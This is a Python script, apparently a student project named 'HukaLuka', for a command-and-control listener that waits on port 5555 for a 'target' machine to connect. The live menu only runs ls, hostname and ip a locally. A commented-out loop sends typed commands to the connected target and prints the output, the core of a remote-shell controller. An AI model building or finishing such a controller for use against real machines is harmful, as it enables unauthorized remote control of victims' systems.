#! /usr/bin/env python3

import subprocess
import socket

HOST = '0.0.0.0' # does this need to be our C2 server?
PORT = 5555 # random port it does not matter

# socket that waits for incoming connection
s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((HOST, PORT))
s.listen(1)
print(f'[*] listening as {HOST}:{PORT}')

# waiting for the target and sent a welcome message if it connected
client_s, client_addr = s.accept()
print(f'[*] client connected {client_addr}')
#client_s.send('welcome'.encode())

# custom menu option for us
#print("Welcome to HukaLuka!")

print(''
'\n******************************************************************'
'\n*                      __          __              __            *'
'\n*        /\  /\       / /         / /             / /            *'
'\n*       / /_/ /_   _ / /__ __    / /       _   _ / /__ __        *'
'\n*      / __  / /__/ /    / - \  / /_____ / /__/ /    / - \       *'
'\n*      \/ /_/______/__/\_\_/\_\/________/______/__/\_\_/\_\      *'
'\n*                                                                *'
'\n* HukaLuka Ver. 7.7                                              *'
'\n* Coded by Aaron, Abdi and Raja                                  *'
'\n******************************************************************\n')

def menu():
    print("[1] ls")
    print("[2] hostname")
    print("[3] ip a")
    print("[0] Exit the program.\n")

menu()
option = int(input("Enter your option: "))

l1 = subprocess.run(['ls'], stdout=subprocess.PIPE, text=True)
l2 = subprocess.run('hostname', stdout=subprocess.PIPE, text=True)
l3 = subprocess.run(['ip', 'a'], stdout=subprocess.PIPE, text=True)

while option != 0:
    if option == 1:
        # use the ls command
        print()
        print(l1.stdout)
    elif option == 2:
        # run hostname
        print()
        print(l2.stdout)
    elif option == 3:
        # run ip a
        print()
        print(l3.stdout)
    else:
        print("\nInvalid option.\n")

    #print()
    menu()
    option = int(input("Enter your option: "))

print("\nThanks for using HukaLuka!")

'''
# this loop will run, until you enter 'quit'
while True:

    # 1. enter the command and send it to the target
    cmd = input('Enter command: ')
    client_s.send(cmd.encode())

    # check if you want to quit
    if cmd.lower() == 'quit':
        break
    elif cmd.lower() == 'exit':
        break

    # get the result of the command, executed on the target pc
    result = client_s.recv(1024).decode()
    print(result)
'''

client_s.close()
s.close()
